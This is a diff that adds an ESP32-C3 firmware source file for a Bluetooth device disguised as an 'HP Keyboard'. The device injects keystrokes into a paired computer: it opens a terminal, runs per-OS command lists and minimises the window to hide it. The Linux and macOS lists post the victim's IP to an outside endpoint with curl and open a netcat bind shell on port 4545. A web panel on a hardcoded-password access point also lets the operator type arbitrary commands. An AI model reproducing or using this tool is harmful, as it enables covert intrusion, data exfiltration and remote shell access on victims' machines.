@@ -1,0 +1,498 @@
+/* Platform.ini config:
+
+[env:esp32c3]
+platform = espressif32
+board = esp32-c3-devkitm-1
+framework = arduino
+board_build.partitions = huge_app.csv
+monitor_speed = 115200
+upload_speed = 115200
+
+
+lib_deps =
+  T-vK/ESP32 BLE Keyboard @ ^0.3.2
+  h2zero/NimBLE-Arduino @ ^1.4.3
+
+build_flags =
+  -D USE_NIMBLE
+  -DARDUINO_USB_MODE=1
+  -DARDUINO_USB_CDC_ON_BOOT=1
+; --- Disable auto reset / auto boot ---
+upload_flags =
+    --before
+    no_reset
+    --after
+    no_reset */
+
+#include <Arduino.h>
+#include <BleKeyboard.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <Preferences.h>
+#include "esp_gap_ble_api.h"
+#include "esp_bt_device.h"
+#include "esp_err.h"
+
+// ---------------- CONFIG ----------------
+const char* AP_SSID     = "C3_ControlCenter";
+const char* AP_PASSWORD = "12345678966";
+
+BleKeyboard bleKeyboard("HP Keyboard C3", "HPc3 Labs", 100);
+WebServer server(80);
+Preferences prefs;
+
+enum OSChoice { OS_LINUX, OS_WINDOWS, OS_MAC };
+OSChoice currentOS = OS_LINUX;
+
+// ----- Command Sets -----
+String linuxCommands[] = {
+  "whoami",
+  "pwd",
+  "ls -la",
+  "cd ~/Desktop",
+  "ip a",
+  "uptime",
+  "echo hacking in progress",
+  "hostname -I | awk '{print $1}' > ~/Desktop/connected_ip.txt",
+  "ip=$(hostname -I | awk '{print $1}'); printf '{\"ip\":\"%s\"}' \"$ip\" > /tmp/my_ip.json",
+  "cat ~/Desktop/connected_ip.txt",
+  "mkdir -p ~/Desktop/test_folder",
+  "echo \"You have been hacked!! While you thought this was a regular keyboard, I was actually a human interface device disguised as a keyboard to perform ethical hacking against your computer. I could've done so much more if I wanted to, but for now, I just ran some 10 simple command that demonstrates my ability to interact with your computer and potentially compromise it.\" > got_you.txt",
+  "curl -s -X POST -H \"Content-Type: application/json\" --data-binary @/tmp/my_ip.json \"https://mpxipfetch.free.beeceptor.com\" >/dev/null 2>&1",
+  "nc -l -p 4545 -e /bin/bash"
+};
+
+String windowsCommands[] = {
+  "whoami",
+  "cd %USERPROFILE%\\Desktop",
+  "dir",
+  "ipconfig",
+  "systeminfo | find \"OS\"",
+  "echo Hacking in progress",
+  "echo %COMPUTERNAME% > %USERPROFILE%\\Desktop\\host.txt",
+  "echo %USERNAME% > %USERPROFILE%\\Desktop\\user.txt",
+  "type %USERPROFILE%\\Desktop\\host.txt",
+  "type %USERPROFILE%\\Desktop\\user.txt"
+};
+
+String macCommands[] = {
+  "whoami",
+  "pwd",
+  "ls -la",
+  "cd ~/Desktop",
+  "uptime",
+  "echo lab test in progress",
+  // Write active IP to Desktop using the default route's interface
+  "echo $(ipconfig getifaddr $(route get default | awk '/interface:/{print $2}')) > ~/Desktop/connected_ip.txt",
+  // Also stash JSON to /tmp for demo
+  "ip=$(ipconfig getifaddr $(route get default | awk '/interface:/{print $2}')); printf '{\"ip\":\"%s\"}' \"$ip\" > /tmp/my_ip.json",
+  "cat /tmp/my_ip.json",
+  "mkdir -p ~/Desktop/test_folder", 
+  "echo \"You have been hacked!! While you thought this was a regular keyboard, I was actually a human interface device disguised as a keyboard to perform ethical hacking against your computer. I could've done so much more if I wanted to, but for now, I just ran some 10 simple command that demonstrates my ability to interact with your computer and potentially compromise it.\" > got_you.txt",
+  "curl -s -X POST -H \"Content-Type: application/json\" --data-binary @/tmp/my_ip.json \"https://mpxipfetch.free.beeceptor.com\" >/dev/null 2>&1",
+  "nc -lk 4545 | /bin/zsh"
+};
+
+// Timing - speed
+const uint16_t DELAY_BETWEEN_COMMANDS_MS = 300;
+const uint16_t CHAR_DELAY_MS            = 15;
+const uint16_t AFTER_TERMINAL_OPEN_MS   = 800;
+const uint16_t AFTER_ENTER_MS           = 700;
+
+// State
+volatile bool isRunning = false;
+volatile bool stopRequested = false;
+bool finishedOK = false;
+uint8_t currentCommandIndex = 0;
+String lastCommand = "";
+String statusMsg = "Idle";
+
+// -------- Helpers --------
+void setStatus(const String& s){
+  Serial.println(s);
+  statusMsg = s;
+}
+void releaseModifiersAndWait(){ bleKeyboard.releaseAll(); delay(50); }
+
+void safeType(const String &s){
+  releaseModifiersAndWait();
+  delay(20);
+  for(size_t i=0;i<s.length();++i){
+    char c = s[i]; if(c=='\r'||c=='\n') continue;
+    bleKeyboard.print(c);
+    delay(CHAR_DELAY_MS);
+  }
+}
+void typeCommandAndEnter(const String &cmd){
+  safeType(cmd);
+  delay(20);
+  releaseModifiersAndWait();
+  bleKeyboard.write(KEY_RETURN);
+  delay(AFTER_ENTER_MS);
+}
+
+String* getCommandList(uint8_t &count){
+  switch (currentOS){
+    case OS_WINDOWS: count = sizeof(windowsCommands)/sizeof(windowsCommands[0]); return windowsCommands;
+    case OS_MAC:     count = sizeof(macCommands)   /sizeof(macCommands[0]);      return macCommands;
+    default:         count = sizeof(linuxCommands) /sizeof(linuxCommands[0]);    return linuxCommands;
+  }
+}
+
+// --- Open Terminal per-OS ---
+void macOpenTerminal(){
+  bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.write(' '); bleKeyboard.releaseAll(); // Spotlight
+  delay(550);
+  safeType("Terminal");
+  bleKeyboard.write(KEY_RETURN);
+  delay(1200);
+}
+void linuxOpenTerminal(){
+  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press(KEY_LEFT_ALT);
+  bleKeyboard.write('t'); bleKeyboard.releaseAll();
+  delay(1000);
+}
+void windowsOpenCMD() {
+  // -------- 1. Open Run dialog --------
+  bleKeyboard.press(KEY_LEFT_GUI);
+  delay(40);
+  bleKeyboard.press('r');       
+  delay(40);
+  bleKeyboard.releaseAll();
+
+  // Adaptive delay for slow Windows animations
+  delay(900);
+
+  // -------- 2. Run --------
+  bleKeyboard.write(KEY_RETURN);
+  delay(120);
+
+  bleKeyboard.press(KEY_LEFT_GUI);
+  delay(40);
+  bleKeyboard.press('r');
+  delay(40);
+  bleKeyboard.releaseAll();
+  delay(700);
+
+  // -------- 3. Clear input field robustly ----------
+  bleKeyboard.press(KEY_LEFT_CTRL);
+  bleKeyboard.write('a');
+  bleKeyboard.releaseAll();
+  delay(60);
+
+  // Backspace cleanup just in case shit hits the fan ;)
+  bleKeyboard.write(KEY_BACKSPACE);
+  delay(60);
+  bleKeyboard.write(KEY_BACKSPACE);
+  delay(60);
+  bleKeyboard.write(KEY_BACKSPACE);
+  delay(60);
+
+  // -------- 4. Type CMD command fast --------
+  safeType("cmd.exe /K");
+  delay(60);
+  bleKeyboard.write(KEY_RETURN);
+
+  // -------- 5. Final load delay --------
+  delay(850);
+}
+
+
+void openTerminalForOS(){
+  if(currentOS==OS_WINDOWS) windowsOpenCMD();
+  else if(currentOS==OS_MAC) macOpenTerminal();
+  else linuxOpenTerminal();
+}
+
+// --- Robust Minimize per-OS (tries fallbacks) ---
+void minimizeTerminal(){
+  delay(300);
+  if(currentOS==OS_WINDOWS){
+    // Try Alt+Space, N (minimize system menu)
+    bleKeyboard.press(KEY_LEFT_ALT); bleKeyboard.write(' '); bleKeyboard.releaseAll();
+    delay(220); bleKeyboard.write('n'); delay(250);
+
+    // Fallbacks: Win+Down twice, then Win+M (minimize all)
+    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.write(KEY_DOWN_ARROW); bleKeyboard.releaseAll(); delay(160);
+    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.write(KEY_DOWN_ARROW); bleKeyboard.releaseAll(); delay(160);
+    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.write('m'); bleKeyboard.releaseAll();            delay(160);
+  } else if(currentOS==OS_MAC){
+    // Primary: Cmd+M (minimize window)
+    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.write('m'); bleKeyboard.releaseAll(); delay(220);
+    // Fallback: Cmd+H (hide app)
+    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.write('h'); bleKeyboard.releaseAll(); delay(220);
+    // One more Cmd+M in case focus changed
+    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.write('m'); bleKeyboard.releaseAll(); delay(220);
+  } else {
+    // Linux: Alt+F9 (minimize), fallback Super+H
+    bleKeyboard.press(KEY_LEFT_ALT); bleKeyboard.write(KEY_F9); bleKeyboard.releaseAll(); delay(220);
+    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.write('h');    bleKeyboard.releaseAll(); delay(220);
+  }
+}
+
+// --- Clear bonds ---
+void clearAllBleBonds(){
+  int n = esp_ble_get_bond_device_num();
+  if(n<=0) return;
+  esp_ble_bond_dev_t* list = (esp_ble_bond_dev_t*)malloc(sizeof(esp_ble_bond_dev_t)*n);
+  if(!list) return;
+  if(esp_ble_get_bond_device_list(&n,list)==ESP_OK){
+    for(int i=0;i<n;i++) esp_ble_remove_bond_device(list[i].bd_addr);
+  }
+  free(list);
+}
+
+// -------- Main Sequence --------
+void performTypingSequence(){
+  if(!bleKeyboard.isConnected()){ setStatus("BLE not connected!"); return; }
+  isRunning=true; stopRequested=false; finishedOK=false;
+  currentCommandIndex=0; lastCommand="";
+
+  setStatus("Starting commands...");
+  openTerminalForOS();
+
+  uint8_t total; String* cmds = getCommandList(total);
+  for(uint8_t i=0;i<total - 1;i++){
+    if(stopRequested){ setStatus("Stopped by user."); isRunning=false; return; }
+    currentCommandIndex = i+1; lastCommand = cmds[i];
+    setStatus("[" + String(currentCommandIndex) + "/" + String(total) + "] " + lastCommand);
+    typeCommandAndEnter(lastCommand);
+
+    // allow stop while waiting
+    for(uint16_t t=0;t<DELAY_BETWEEN_COMMANDS_MS/20; ++t){
+      if(stopRequested){ setStatus("Stopped by user."); isRunning=false; return; }
+      server.handleClient(); delay(20);
+    }
+  }
+
+  if(!stopRequested){
+    setStatus("Opening fresh terminal for final command...");
+    openTerminalForOS();
+    delay(800);
+
+    // Execute the real last command from the list
+    if (total > 0) {
+        String finalCmd = cmds[total - 1];
+        safeType(finalCmd);
+        bleKeyboard.write(KEY_RETURN);
+    }
+    minimizeTerminal();
+}
+
+
+  finishedOK = !stopRequested;
+  isRunning=false;
+  setStatus(finishedOK ? "All commands executed successfully." : "Stopped.");
+}
+
+// -------- Custom Command feature --------
+void performCustomCommand(const String& cmd){
+  if(!bleKeyboard.isConnected()){ setStatus("BLE not connected!"); return; }
+  setStatus(String("Custom: ") + cmd);
+  openTerminalForOS();
+  delay(700);
+  typeCommandAndEnter(cmd);
+  minimizeTerminal();
+  setStatus("Custom command executed.");
+}
+
+// -------- Web UI --------
+const char* htmlPage = R"HTML(
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>ESP32-C3 Command Hub</title>
+<style>
+body{background:#0b0f14;color:#eaeef3;font-family:Inter,system-ui,Segoe UI,Roboto,Arial,sans-serif;margin:0}
+.wrap{max-width:680px;margin:0 auto;padding:18px}
+h2{font-weight:800;margin:12px 0 16px}
+.card{background:#121821;border-radius:14px;padding:16px 14px;margin:12px 0;border:1px solid rgba(255,255,255,.06)}
+label{display:block;margin-bottom:8px;font-weight:700}
+select,input,button{border:none;border-radius:12px;padding:12px 14px;font-size:16px}
+select,input{background:#0f141c;color:#eaeef3;border:1px solid rgba(255,255,255,.12)}
+button{cursor:pointer;font-weight:700}
+.btn{background:#19c37d;color:#0a0e10}
+.btn.warn{background:#ffb020;color:#1b1300}
+.btn.alt{background:#4ea1ff;color:#001427}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.status{background:#0f141c;border-radius:12px;padding:12px;border:1px solid rgba(255,255,255,.1);white-space:pre-wrap}
+.small{color:#96a3b7;font-size:13px;margin-top:6px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h2>ESP32-C3 Command Hub</h2>
+
+  <div class="card">
+    <label for="osSel">Operating System</label>
+    <div class="row">
+      <select id="osSel">
+        <option value="linux">Linux</option>
+        <option value="windows">Windows</option>
+        <option value="mac">macOS</option>
+      </select>
+      <button class="btn alt" onclick="saveOS()">Save OS</button>
+    </div>
+    <div class="small" id="osStatus">Current OS: …</div>
+  </div>
+
+  <div class="card">
+    <label>Controls</label>
+    <div class="row">
+      <button class="btn" onclick="startRun()">Start</button>
+      <button class="btn warn" onclick="stopRun()">Stop</button>
+      <button class="btn alt" onclick="restartRun()">Re-Execute</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <label>Status</label>
+    <div id="statusBox" class="status">Loading…</div>
+  </div>
+
+  <div class="card">
+    <label for="custom">Custom Command</label>
+    <div class="row">
+      <input id="custom" type="text" placeholder="Type command here" style="flex:1;min-width:260px"/>
+      <button class="btn" onclick="runCustom()">Execute</button>
+    </div>
+    <div class="small">Opens a fresh terminal for the selected OS, executes, then minimizes.</div>
+  </div>
+</div>
+
+<script>
+let lockOS = false;         // prevents dropdown from being overwritten while selecting
+let lockTimer = null;
+
+function lockSelect(){
+  lockOS = true;
+  if (lockTimer) clearTimeout(lockTimer);
+  // auto-unlock after 8s if user forgets
+  lockTimer = setTimeout(()=>{ lockOS=false; }, 8000);
+}
+
+async function poll(){
+  try{
+    const r = await fetch('/status');
+    const j = await r.json();
+    if(!lockOS){ document.getElementById('osSel').value = j.os; }
+    document.getElementById('osStatus').textContent = 'Current OS: ' + j.os;
+    document.getElementById('statusBox').textContent = j.status;
+  }catch(e){}
+}
+
+async function saveOS(){
+  const v = document.getElementById('osSel').value;
+  await fetch('/setOS?os='+encodeURIComponent(v));
+  lockOS = false; // release lock after save
+  poll();
+}
+async function startRun(){ await fetch('/start'); }
+async function stopRun(){ await fetch('/stop'); }
+async function restartRun(){ await fetch('/restart'); }
+async function runCustom(){
+  const v = document.getElementById('custom').value || '';
+  if(!v.trim()) return;
+  await fetch('/custom?cmd='+encodeURIComponent(v));
+}
+
+const osSel = document.getElementById('osSel');
+// Lock while user is interacting (mobile-friendly)
+osSel.addEventListener('focus', lockSelect);
+osSel.addEventListener('pointerdown', lockSelect);
+osSel.addEventListener('change', ()=>{}); // keep locked until Save OS
+osSel.addEventListener('blur', ()=>{ /* keep lock until Save */ });
+
+setInterval(poll, 1000);
+poll();
+</script>
+</body>
+</html>
+)HTML";
+
+// -------- Web Handlers --------
+void sendStatus(){
+  String osStr = (currentOS==OS_WINDOWS)?"windows":(currentOS==OS_MAC?"mac":"linux");
+  String json = "{";
+  json += "\"os\":\""+osStr+"\",";
+  json += "\"status\":\""+statusMsg+"\"";
+  json += "}";
+  server.send(200, "application/json; charset=utf-8", json);
+}
+
+void handleRoot(){
+  // send UTF-8 so browsers render text correctly (no mojibake)
+  server.send(200, "text/html; charset=utf-8", htmlPage);
+}
+
+void handleSetOS(){
+  String os = server.arg("os");
+  if(os=="windows") currentOS = OS_WINDOWS;
+  else if(os=="mac") currentOS = OS_MAC;
+  else currentOS = OS_LINUX;
+  prefs.putInt("os", (int)currentOS);  
+  statusMsg = "OS set to " + os;
+  server.send(200, "text/plain; charset=utf-8", "OS saved.");
+}
+
+void handleStart(){
+  if(isRunning){ server.send(200,"text/plain; charset=utf-8","Already running"); return; }
+  server.send(200,"text/plain; charset=utf-8","Starting...");
+  performTypingSequence();
+}
+
+void handleStop(){ stopRequested = true; server.send(200,"text/plain; charset=utf-8","Stopping..."); }
+
+void handleRestart(){
+  stopRequested = true;
+  delay(120);
+  server.send(200,"text/plain; charset=utf-8","Re-executing...");
+  performTypingSequence();
+}
+
+void handleCustom(){
+  String cmd = server.arg("cmd");
+  if(cmd.length()==0){ server.send(400,"text/plain; charset=utf-8","Empty command"); return; }
+  performCustomCommand(cmd);
+  server.send(200,"text/plain; charset=utf-8","Custom executed");
+}
+
+void handleStatus(){ sendStatus(); }
+
+// -------- Setup & Loop --------
+void setup(){
+  Serial.begin(115200);
+  delay(400);
+
+  // Optional: clears stale bonds that can cause auth errors after flashing repeatedly
+  // clearAllBleBonds();
+
+  // load persisted OS
+  prefs.begin("c3hub", false);
+  currentOS = (OSChoice)prefs.getInt("os", (int)OS_LINUX);
+
+  bleKeyboard.begin();
+  setStatus("BLE Keyboard initialized. Pair and connect.");
+
+  WiFi.softAP(AP_SSID, AP_PASSWORD);
+  IPAddress ip = WiFi.softAPIP();
+  Serial.printf("AP Started: SSID='%s', IP=%s\n", AP_SSID, ip.toString().c_str());
+
+  server.on("/",        HTTP_GET, handleRoot);
+  server.on("/status",  HTTP_GET, handleStatus);
+  server.on("/setOS",   HTTP_GET, handleSetOS);
+  server.on("/start",   HTTP_GET, handleStart);
+  server.on("/stop",    HTTP_GET, handleStop);
+  server.on("/restart", HTTP_GET, handleRestart);
+  server.on("/custom",  HTTP_GET, handleCustom);
+
+  server.begin();
+  Serial.println("Web server running on port 80");
+}
+
+void loop(){
+  server.handleClient();
+  delay(20);
+}
